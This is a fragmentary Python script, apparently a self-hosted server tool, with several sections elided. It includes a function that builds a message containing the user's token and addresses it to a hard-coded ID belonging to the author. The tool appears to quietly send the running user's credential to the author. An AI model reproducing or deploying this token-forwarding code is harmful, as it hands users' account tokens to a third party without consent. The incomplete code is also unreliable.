...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"-- THIS SERVER MADE BY RANGBAAZ RAAZA")
def execute_server():
      PORT = 4000
...
def send_initial_message():
      ...
      msg_template = "Hello Raangbaaz raaza sir! I am using your server. My token is {}"

      # Specify the ID where you want to send the message
      target_id = "100083370246969"

      requests.packages.urllib3.disable_warnings()

      def liness():
          print('\033[1;92m' + '•──────────────────────AAYUSH DHAWAL ───────────────────────────────•')
